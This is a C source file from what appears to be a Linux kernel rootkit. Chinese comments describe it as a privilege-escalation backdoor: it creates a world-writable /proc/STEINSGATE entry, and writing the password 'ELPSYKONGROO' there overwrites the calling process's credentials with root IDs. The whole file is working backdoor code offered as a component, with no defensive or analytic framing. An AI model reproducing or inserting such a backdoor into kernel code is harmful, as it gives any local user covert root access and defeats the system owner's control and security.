#include "../header/hide.h"

// 这一部分是后门提权的代码
// 原理参考wiki，简要解释如下：
// 在用户向文件"/proc/STEINSGATE"输入字符串“ELPSYKONGROO"时，即可获得root权限。
struct proc_dir_entry *entry;


ssize_t write_handler(struct file * filp, const char __user *buff, size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(PASSWORD) &&
        strncmp(PASSWORD, kbuff, count) == 0) {

        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk(KERN_INFO "Top privileges granted!\n");
    } else {
        printk(KERN_INFO "Our Backdoor is detected and under attack!\n");
    }

    kfree(kbuff);
    return count;
}

struct file_operations proc_fops = {
    .write = write_handler
};

void backdoor(void) {
    entry = proc_create(BACKDOOR, S_IRUGO | S_IWUGO, NULL, &proc_fops);
}

void cleanbackdoor(void) {
    proc_remove(entry);
}
